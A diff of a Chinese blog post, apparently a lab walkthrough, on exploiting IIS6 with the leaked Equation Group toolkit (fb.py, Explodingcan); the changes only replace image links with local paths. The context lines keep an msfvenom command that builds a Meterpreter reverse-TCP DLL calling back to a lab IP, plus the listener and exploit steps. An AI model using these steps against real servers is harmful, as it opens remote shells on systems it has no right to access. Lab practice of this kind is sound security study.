@@ -14,6 +14,7 @@ tags: 网络安全
 
 以上所有IP之间均可以直接访问
 <!--more-->
+
 ### 验证步骤：
 
 * * *
@@ -24,7 +25,7 @@ tags: 网络安全
 
 首先通过xshell连接到kali linux，打开xshell，在跳出来的窗口点击new(新建)，然后填入kali的IP地址点击确定然后连接，接着依次输入kali的账号与密码即可连接，可能会跳出安全警告，点击接收并保存即可，连接完成得到如图：
 
-![1.jpg](https://blog-1252906577.costj.myqcloud.com/img/NSA%E6%BC%94%E7%A4%BA/1.jpg "1.jpg")
+![1.jpg](post164/1.jpg)
 
 0x02
 
@@ -39,11 +40,11 @@ msfvenom -p windows/meterpreter/reverse_tcp LHOST=172.16.12.2 LPORT=5555 -f dll 
 
 点击xshell如图位置
 
-![3.jpg](https://blog-1252906577.costj.myqcloud.com/img/NSA%E6%BC%94%E7%A4%BA/3.jpg "3.jpg")
+![3.jpg](post164/3.jpg)
 
 打开本地C盘，并将kali目录下刚刚生成的s.dll复制到本机的C盘根目录下，如图
 
-![4.jpg](https://blog-1252906577.costj.myqcloud.com/img/NSA%E6%BC%94%E7%A4%BA/4.jpg "4.jpg")
+![4.jpg](post164/4.jpg)
 
 #### 第二步：配置kali使得kali处于监听状态
 
@@ -61,7 +62,7 @@ exploit
 ```
 看到如图即说明配置成功
 
-![2.jpg](https://blog-1252906577.costj.myqcloud.com/img/NSA%E6%BC%94%E7%A4%BA/2.jpg "2.jpg")
+![2.jpg](post164/2.jpg)
 
 这时就可以将xshell最小化，等后边再用
 
@@ -71,7 +72,7 @@ exploit
 
 将方程式工具包下的windows文件夹重命名为win，然后拷贝到C盘根目录下，并在该文件夹下新建一个名为"listeningposts"的文件夹，如图，不然运行会报错
 
-![5.jpg](https://blog-1252906577.costj.myqcloud.com/img/NSA%E6%BC%94%E7%A4%BA/5.jpg "5.jpg")
+![5.jpg](post164/5.jpg)
 
 0x02
 
@@ -81,7 +82,7 @@ C:\win\fb.py
 ```
 然后依次输入目标IP，本地IP，是否重定向，日志存放位置，新建工程，给该工程命名，最后确认，如图
 
-![1.jpg](https://blog-1252906577.costj.myqcloud.com/img/NSA%E6%BC%94%E7%A4%BA/iis6/1.jpg "1.jpg")
+![1.jpg](post164/1-16273798173061.jpg)
 
 最后敲击回车
 
@@ -94,12 +95,12 @@ use Explodingcan
 
 使用该工具，之后除了下图所示位置需要修改，其他都保持默认直接敲击回车即可
 
-![](https://blog-1252906577.costj.myqcloud.com/img/NSA%E6%BC%94%E7%A4%BA/iis6/2.jpg "2.jpg")
+![2.jpg](post164/2-16273798424632.jpg)
 
 （选择系统，CallbackIP、CallbackPort等，端口可以任意设置）
 
-![](https://blog-1252906577.costj.myqcloud.com/img/NSA%E6%BC%94%E7%A4%BA/iis6/3.jpg "3.jpg")
+![3.jpg](post164/3-16273798583573.jpg)
 
 之后都保存默认配置，攻击成功如图
 
-![4.jpg](https://blog-1252906577.costj.myqcloud.com/img/NSA%E6%BC%94%E7%A4%BA/iis6/4.jpg "4.jpg")
+![4.jpg](post164/4-16273798725894.jpg)
